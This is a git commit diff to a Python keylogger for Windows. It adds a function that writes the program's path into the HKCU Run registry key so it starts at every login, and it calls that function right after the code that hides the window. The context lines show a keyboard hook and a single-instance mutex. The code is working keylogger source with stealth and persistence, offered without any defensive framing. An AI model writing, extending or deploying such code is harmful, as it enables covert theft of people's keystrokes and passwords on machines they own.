05e789efaf6d6e75c1cdc47814e81db11fbff113
gilmansharov <gilmansharov@gmail.com>
2016-11-29 22:02:16 +0200

    Add files via upload

--- keylogger.py
+++ keylogger.py
@@ -54,6 +54,21 @@ class myThread (threading.Thread):
     def run(self):
         main()
 
+def addStartup():
+	if getattr(sys, 'frozen', False):
+		fp = os.path.dirname(os.path.realpath(sys.executable))
+	elif __file__:
+		fp = os.path.dirname(os.path.realpath(__file__))
+	file_name=sys.argv[0].split("\\")[-1]
+	new_file_path=fp+"\\"+file_name
+	keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
+
+	key2change= OpenKey(HKEY_CURRENT_USER,
+	keyVal,0,KEY_ALL_ACCESS)
+
+	SetValueEx(key2change, "logger",0,REG_SZ, new_file_path)
+
+
 #Disallowing multiple instances of the keylogger
 def disallow_Multiple_Instances():
     mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
@@ -179,6 +194,7 @@ def main():
     pythoncom.PumpMessages()
 
 hide()
+addStartup()
 hm = pyHook.HookManager()
 disallow_Multiple_Instances()
 thread = myThread(1, "Thread", 1)
